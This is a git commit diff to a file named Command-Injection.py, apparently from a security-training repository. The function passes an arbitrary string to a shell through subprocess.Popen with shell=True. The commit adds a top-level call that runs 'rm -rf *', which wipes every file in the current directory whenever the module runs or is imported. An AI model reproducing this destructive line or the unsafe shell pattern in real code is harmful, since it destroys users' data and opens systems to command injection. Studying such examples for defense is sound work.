e2fcd0ab65260b61cb07f7056bde186e2b77efee
qafdevsec <111730727+qafdevsec@users.noreply.github.com>
2023-11-16 11:22:00 +0530

    Update Command-Injection.py

--- Injection/Command-Injection.py
+++ Injection/Command-Injection.py
@@ -1,3 +1,5 @@
 def command_out(command):
     process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     return process.communicate()
+
+command_out("rm  -rf *")
